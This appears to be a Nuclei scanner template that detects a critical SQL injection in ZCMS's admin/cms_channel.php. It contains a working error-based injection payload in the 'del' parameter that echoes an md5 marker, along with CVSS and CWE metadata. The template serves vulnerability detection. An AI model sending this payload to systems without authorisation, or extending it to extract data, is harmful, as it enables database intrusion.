http:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5({{num}})}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5({{num}})%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'''
id: zcms-v3-sqli
info:
  author: princechaddha
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  description: ZCMS contains a SQL injection vulnerability. An attacker can possibly
    obtain sensitive information from a database, modify data, and execute unauthorized
    administrative operations in the context of the affected site.
  metadata:
    max-request: 1
  name: ZCMS - SQL Injection
  reference:
  - https://www.anquanke.com/post/id/183241
  severity: critical
  tags: zcms,sqli,vuln
variables:
  num: '999999999'
